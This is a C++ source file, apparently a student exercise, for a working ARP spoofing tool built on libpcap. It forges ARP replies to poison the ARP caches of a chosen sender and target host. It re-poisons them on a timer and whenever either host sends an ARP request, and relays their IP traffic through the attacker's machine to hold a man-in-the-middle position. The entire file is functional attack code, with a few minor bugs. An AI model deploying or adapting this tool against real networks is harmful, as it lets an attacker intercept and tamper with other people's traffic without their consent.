#include <cstdint>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "ipv4.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <iostream>
#include <unistd.h>
#include <thread>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct IpMac {
	Ip ip;
	Mac mac;
};

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool infect_arp(IpMac* myIpMac, IpMac* senderIpMac, IpMac* targetIpMac , pcap* pcap) {
	EthArpPacket packet;

	packet.eth_.dmac_ = senderIpMac->mac; //victim mac
	packet.eth_.smac_ = myIpMac->mac; //my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = myIpMac->mac; //my mac
	packet.arp_.sip_ = htonl(targetIpMac->ip);	//target ip
	packet.arp_.tmac_ = senderIpMac->mac; //victim mac
	packet.arp_.tip_ = htonl(senderIpMac->ip);  //victim ip
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return false;
	}
	
	cout << "infect ip : " << string(senderIpMac->ip) << ", arp table : " << string(targetIpMac->ip) << " : " << string(myIpMac->mac) << "\n";

	return true;
}

bool get_my_ip_mac(IpMac* myIpMac, const char* interface){
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		perror("Failed to create socket");
		return false;
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("Failed to get MAC address");
		close(sockfd);
		return false;
	}

	myIpMac->mac =  Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

	if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
		perror("Failed to get IP address");
		close(sockfd);
		return false;
	}

	myIpMac->ip = Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));

	close(sockfd);

	return true;
}

bool get_other_mac(IpMac* myIpMac, IpMac* otherIpMac, pcap_t* pcap){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //broadcast
	packet.eth_.smac_ = myIpMac->mac; //my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request	);

	packet.arp_.smac_ = myIpMac->mac; //my mac
	packet.arp_.sip_ = htonl(myIpMac->ip);	//my ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim mac
	packet.arp_.tip_ = htonl(otherIpMac->ip);  //victim ip
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return false;
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		struct EthHdr* ethHdr = (EthHdr*) packet;
		struct ArpHdr* arpHdr = (ArpHdr*) (packet+sizeof(EthHdr));

		if((ethHdr->type_ == htons(EthHdr::Arp)) & (arpHdr->op_ == htons(ArpHdr::Reply)) & (otherIpMac->ip == Ip(ntohl((uint32_t)arpHdr->sip_)))){
			otherIpMac->mac = Mac(arpHdr->smac_);
			break;
		}
	}

	return 0;
}

void for_infect_arp(IpMac* myIpMac, IpMac* senderIpMac, IpMac* targetIpMac , pcap* pcap) {
	while (true) {
		this_thread::sleep_for(chrono::seconds(100));
		infect_arp(myIpMac, senderIpMac, targetIpMac , pcap);
		infect_arp(myIpMac, targetIpMac, senderIpMac , pcap);
		cout << "success reset target <-> sender\n---------------------------------------\n";
	}
}

void reflect_infect_arp(IpMac* myIpMac, IpMac* senderIpMac, IpMac* targetIpMac , pcap* pcap) {
	while (true) {
		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(pcap, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
				break;
			}
			struct EthHdr* ethHdr = (EthHdr*) packet;
			struct ArpHdr* arpHdr = (ArpHdr*) (packet+sizeof(EthHdr));

			// sender -> target
			if((ethHdr->type_ == ntohs(EthHdr::Arp)) && (arpHdr->op_ == htons(ArpHdr::Request)) && (ethHdr->smac_ == senderIpMac->mac) && (Ip(ntohl((uint32_t)arpHdr->tip_)) == targetIpMac->ip)){
				infect_arp(myIpMac, senderIpMac, targetIpMac , pcap);
				cout << "success reflect sender -> target\n---------------------------------------\n";
				break;
			} // target -> sender
			else if ((ethHdr->type_ == htons(EthHdr::Arp)) & (arpHdr->op_ == htons(ArpHdr::Request)) & (ethHdr->smac_ == targetIpMac->mac) & (Ip(ntohl((uint32_t)arpHdr->tip_)) == senderIpMac->ip )) {
				infect_arp(myIpMac, targetIpMac, senderIpMac , pcap);
				cout << "success reflect target -> sender\n---------------------------------------\n";
				break;
			}
		}
	}
}

void pass_packet(IpMac* myIpMac, IpMac* senderIpMac, IpMac* targetIpMac , pcap* pcap) {
	while (true) {
		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(pcap, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
				break;
			}

			u_char* tamperedPacket = (u_char*)malloc(header->caplen);
			memcpy(tamperedPacket, packet, header->caplen);

			struct EthHdr* ethHdr = (EthHdr*) tamperedPacket;
			struct ipv4_hdr* ipv4Hdr = (ipv4_hdr*) (tamperedPacket+sizeof(EthHdr));

			if((ethHdr->type_ == htons(EthHdr::Ip4)) & (ethHdr->smac_ == senderIpMac->mac)){ // (ipv4Hdr->ip_p == ipv4_hdr::TCP) &
				ethHdr->dmac_ = Mac(targetIpMac->mac);
				ethHdr->smac_ = Mac(myIpMac->mac);
				int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tamperedPacket), header->caplen);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
				}
				cout << "destination ip : " << string(Ip(ntohl((uint32_t)ipv4Hdr->ip_dst))) << "\n";
				cout << "pass packet sender->target\n---------------------------------------\n";
			}
			else if((ethHdr->type_ == htons(EthHdr::Ip4)) & (ethHdr->smac_ == targetIpMac->mac)){
				ethHdr->dmac_ = Mac(senderIpMac->mac);
				ethHdr->smac_ = Mac(myIpMac->mac);
				int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tamperedPacket), header->caplen);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
				}

				cout << "destination ip : " << string(Ip(ntohl((uint32_t)ipv4Hdr->ip_dst))) << "\n";
				cout << "pass packet target->sender\n---------------------------------------\n";
			}
			free(tamperedPacket);
		}
	}
}

bool srp_spoof(const char* interface, const char* senderIp, const char* targetIp) {

	//pcap1
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return EXIT_FAILURE;
	}

	//pcap2
	char errbuf2[PCAP_ERRBUF_SIZE];
	pcap_t* pcap2 = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf2);
	if (pcap2 == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf2);
		return EXIT_FAILURE;
	}

	//pcap3
	char errbuf3[PCAP_ERRBUF_SIZE];
	pcap_t* pcap3 = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf3);
	if (pcap2 == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf3);
		return EXIT_FAILURE;
	}

	// wjdqhtnwlq
	struct IpMac myIpMac;
	struct IpMac senderIpMac;
	struct IpMac targetIpMac;

	//so ip alc aorwnth tnwlq
	get_my_ip_mac(&myIpMac, interface);
	cout << "my ip : " << string(myIpMac.ip) << "\n";
	cout << "my mac : " << string(myIpMac.mac) << "\n";
	cout << "success get my ip and mac\n---------------------------------------\n";
	//sender ip alc aorwnth tnwlq
	senderIpMac.ip = Ip(senderIp);
	get_other_mac(&myIpMac, &senderIpMac, pcap);
	cout << "sender ip : " << string(senderIpMac.ip) << "\n";
	cout << "sender mac : " << string(senderIpMac.mac) << "\n";
	cout << "success get sender ip and mac\n---------------------------------------\n";

	//target ip alc aorwnth tnwlq
	targetIpMac.ip = Ip(targetIp);
	get_other_mac(&myIpMac, &targetIpMac, pcap);
	cout << "target ip : " << string(targetIpMac.ip) << "\n";
	cout << "target mac : " << string(targetIpMac.mac) << "\n";
	cout << "success get target ip and mac\n---------------------------------------\n";

	infect_arp(&myIpMac, &senderIpMac, &targetIpMac , pcap);
	infect_arp(&myIpMac, &targetIpMac, &senderIpMac , pcap);
	cout << "success infect_arp\n---------------------------------------\n";

	std::thread t1(for_infect_arp, &myIpMac, &senderIpMac, &targetIpMac, pcap);
	std::thread t2(reflect_infect_arp, &myIpMac, &senderIpMac, &targetIpMac, pcap2);
	std::thread t3(pass_packet, &myIpMac, &senderIpMac, &targetIpMac, pcap3);

	t1.join();
	t2.join();
	t3.join();

	pcap_close(pcap);
	pcap_close(pcap2);
	pcap_close(pcap3);

	return true;
}

int main(int argc, char* argv[]) {
	if (argc%2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* interface = argv[1];
	for (int i = 2; i < argc; i+=2) { //argc = 4 6 8
		printf("%s, %s, %s\n",interface, argv[i], argv[i+1]);
		cout << "---------------------------------------\n";
		if (!(srp_spoof(interface, argv[i], argv[i+1]))) {
			fprintf(stderr, "couldn't srp_spoof(%s <-> %s)\n", argv[i], argv[i+1]);
		}
	}
}
